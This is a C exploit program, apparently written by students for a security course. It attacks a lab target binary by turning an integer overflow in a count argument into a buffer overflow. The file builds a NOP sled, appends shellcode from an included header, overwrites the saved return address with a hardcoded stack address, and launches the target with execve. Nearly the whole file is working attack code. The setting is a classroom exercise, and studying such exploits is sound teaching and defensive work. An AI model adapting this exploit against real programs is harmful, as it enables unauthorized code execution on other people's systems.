/* sploit3.c
 *
 * William Ersing & Warren Smith
 * CSC 450
 *
 * This integer overflow exploit takes advantage of a flaw in target3.c
 * The flaw is found in the line:
 * "count = (int)strtoul(argv[1], &in, 10)"
 * Exploiting this flaw requires inputting a sufficiently large number,
 * which forces the int to wrap around and overflow the buffer.
 * From this point, the exploit is a straightforword buffer overflow.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target3"
#define LOADSIZE 20032

int main(void){
  char *args[3];
  char *env[1];
  char load[LOADSIZE];
  char *count;
  
  count = " 4080219932,";               /* When cast to int, this string wraps
                               around to 20016, and overflows the buffer */

  memset(load, 0x90, LOADSIZE - 1);         // Fill exploit string with NOPs
  memcpy(load, count, strlen(count));           // Place count at start of exploit string
  memcpy(load + strlen(count), shellcode,
         strlen(shellcode));            // Place shellcode next

  *(unsigned long *)(load + 20024) = 0xbfff6210;    // Point eip at shellcode in buffer

  load[LOADSIZE - 1] = 0;               // NULL terminate the exploit string

  args[0] = TARGET;
  args[1] = load;
  args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
